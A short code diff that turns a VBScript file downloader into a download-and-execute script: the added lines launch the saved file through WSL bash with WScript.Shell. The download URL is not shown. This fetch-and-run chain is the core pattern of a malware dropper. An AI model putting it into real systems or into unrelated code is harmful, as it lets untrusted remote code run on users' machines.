@@ -1,7 +1,8 @@
-' VBScript to download a file from the internet
+' VBScript to download a file from the internet and execute it
 
-Dim httpRequest, stream
+Dim httpRequest, stream, shell
 Set httpRequest = CreateObject("MSXML2.XMLHTTP")
+Set shell = CreateObject("WScript.Shell")
 
 ' Specify the URL of the file to download
 Dim fileUrl
@@ -27,8 +28,12 @@ If httpRequest.Status = 200 Then
     stream.SaveToFile filePath, 2 '2 = overwrite if file already exists
     stream.Close
     Set stream = Nothing
+
+    ' Execute the downloaded script using bash
+    shell.Run "wsl bash -c 'bash " & filePath & "; exec bash'", 1, False '1 = show window, False = do not wait for completion
 Else
     MsgBox "Failed to download the file. Status: " & httpRequest.Status
 End If
 
 Set httpRequest = Nothing
+Set shell = Nothing
